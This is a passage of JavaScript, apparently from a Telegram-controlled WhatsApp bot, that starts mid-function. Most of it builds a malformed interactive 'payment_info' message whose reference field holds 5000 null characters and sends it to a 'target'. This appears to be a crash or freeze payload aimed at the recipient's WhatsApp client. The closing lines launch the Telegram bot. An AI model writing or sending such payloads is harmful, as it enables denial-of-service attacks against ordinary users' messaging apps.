    await sock.relayMessage(target, {
      interactiveMessage: {
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_info",
              buttonParamsJson: JSON.stringify({
                currency: "IDR",
                total_amount: { value: 0, offset: 100 },
                reference_id: "\u0000".repeat(5000)
              })
            }
          ]
        }
      }
    }, {});
  } catch (e) {
    console.error(e);
  }
  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
}
// --- Jalankan Bot ---
// Fungsi untuk menginisialisasi bot dengan verifikasi token
  // Jalankan koneksi WhatsApp

  // Lanjutkan menjalankan bot Telegram
  bot.launch();
  console.log("Telegram bot is running...");
  
  